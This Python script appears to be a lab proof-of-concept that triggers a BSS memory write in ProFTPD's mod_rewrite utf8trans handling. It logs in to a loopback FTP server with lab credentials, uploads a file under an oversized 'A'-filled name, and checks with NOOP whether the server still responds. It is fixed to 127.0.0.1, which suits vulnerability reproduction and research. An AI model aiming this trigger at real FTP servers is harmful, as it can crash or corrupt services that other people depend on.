#!/usr/bin/env python3
"""Loopback-only trigger client for ProFTPD mod_rewrite utf8trans BSS write."""
import io
import socket
import sys
import time
import ftplib

port = int(sys.argv[1]) if len(sys.argv) > 1 else 21874
nlen = int(sys.argv[2]) if len(sys.argv) > 2 else 2048
host = "127.0.0.1"

for attempt in range(40):
    try:
        s = socket.create_connection((host, port), 1)
        s.close()
        break
    except OSError:
        time.sleep(0.25)
else:
    print("SERVER_NOT_READY")
    sys.exit(2)

name = "A" * nlen
ftp = ftplib.FTP()
try:
    ftp.connect(host, port, timeout=8)
    ftp.login("labuser", "labpass")
    ftp.set_pasv(True)
    ftp.sock.settimeout(8)
    print("LOGIN_OK")
    try:
        ftp.storbinary("STOR " + name, io.BytesIO(b"x" * 64))
        print("STOR_OK name_len=%d" % nlen)
    except Exception as exc:
        print("STOR_FAIL name_len=%d %s: %s" % (nlen, type(exc).__name__, str(exc)[:160]))
    try:
        print("NOOP=" + str(ftp.voidcmd("NOOP"))[:100])
    except Exception as exc:
        print("NOOP_FAIL %s: %s" % (type(exc).__name__, str(exc)[:120]))
except Exception as exc:
    print("CLIENT_FAIL %s: %s" % (type(exc).__name__, str(exc)[:200]))
finally:
    try:
        ftp.close()
    except Exception:
        pass
